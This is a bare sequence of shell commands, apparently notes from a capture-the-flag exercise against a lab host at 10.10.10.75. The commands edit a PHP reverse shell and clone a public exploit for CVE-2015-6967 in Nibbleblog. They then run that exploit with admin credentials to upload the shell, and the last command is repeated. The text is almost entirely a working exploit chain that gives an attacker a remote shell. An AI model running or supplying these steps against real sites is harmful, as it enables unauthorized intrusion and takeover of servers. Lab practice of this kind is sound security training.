```
vi php-reverse-shell.php
# /usr/share/webshells/php/php-reverse-shell.php
git clone https://github.com/dix0nym/CVE-2015-6967.git
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload ../php-reverse-shell.php
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload ../php-reverse-shell.php
```
